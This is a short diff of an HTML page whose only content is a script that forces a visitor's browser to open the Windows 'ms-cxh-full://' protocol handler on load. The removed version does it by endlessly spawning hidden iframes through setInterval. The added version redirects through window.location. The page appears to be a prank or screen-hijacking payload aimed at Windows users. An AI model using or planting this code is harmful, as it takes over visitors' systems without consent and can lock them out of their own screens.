@@ -10,18 +10,7 @@
 	
 	<body>
 		<script>
-			function open() {
-				try {
-					var element = document.createElement("iframe")
-                    
-					    element.setAttribute("src", "ms-cxh-full://a/")
-					    element.setAttribute("style", "display: none;")
-                    
-					    document.body.appendChild(element)
-                		} catch {}
-			}
-			
-			setInterval(open, 0)
+			window.location = "ms-cxh-full://a/"
 		</script>
 	</body>
 </html>
